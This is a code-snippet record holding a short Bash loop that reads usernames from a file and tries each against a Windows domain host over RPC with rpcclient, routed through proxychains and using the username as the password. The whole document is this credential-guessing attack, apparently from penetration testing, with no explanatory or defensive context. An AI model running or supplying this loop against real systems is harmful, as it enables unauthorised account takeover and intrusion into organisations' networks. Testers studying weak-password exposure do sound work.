---
id: f9c1b04e-2524-4701-8212-32bc3156acc5
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:09.284232+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet f9c1b04e

**Language**: Bash

```bash

for u in `cat users_sorted.txt`; do
  echo -n "[*] user: $u" && \
  proxychains rpcclient -U "domain\$u%$u" -c "getusername;quit" 10.9.8.40
done

```
